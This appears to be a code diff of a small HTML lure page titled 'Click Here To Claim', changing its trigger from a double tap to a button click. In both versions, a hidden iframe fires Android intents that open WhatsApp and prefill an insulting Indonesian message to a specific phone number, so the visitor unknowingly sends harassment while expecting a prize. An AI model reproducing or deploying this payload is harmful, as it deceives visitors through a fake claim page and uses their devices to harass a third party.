@@ -1,23 +1,16 @@
 <title>Click Here To Claim</title>
 
-<script>
-    let lastTap = 0;
-    
-    document.addEventListener("touchend", function(event) {
-        let currentTime = new Date().getTime();
-        let tapLength = currentTime - lastTap;
-        
-        if (tapLength < 300 && tapLength > 0) { // Jika double tap dalam rentang 300ms
-            let iframe = document.createElement("iframe");
-            iframe.style.display = "none";
-            iframe.src = "intent://whatsapp.com#Intent;scheme=https;package=com.heytap.browser;end;";
-            document.body.appendChild(iframe);
+<button id="claimButton">Click Here To Claim</button>
 
-            setTimeout(() => {
-                iframe.src = 'intent://send?phone=6281210087401&text=Shinzu%20Adalah%20Binatang#Intent;scheme=whatsapp;package=com.whatsapp;end;';
-            }, 3000);
-        }
-        
-        lastTap = currentTime;
+<script>
+    document.getElementById("claimButton").addEventListener("click", function() {
+        let iframe = document.createElement("iframe");
+        iframe.style.display = "none";
+        iframe.src = "intent://whatsapp.com#Intent;scheme=https;package=com.heytap.browser;end;";
+        document.body.appendChild(iframe);
+
+        setTimeout(() => {
+            iframe.src = 'intent://send?phone=6281210087401&text=Shinzu%20Adalah%20Binatang#Intent;scheme=whatsapp;package=com.whatsapp;end;';
+        }, 3000);
     });
 </script>
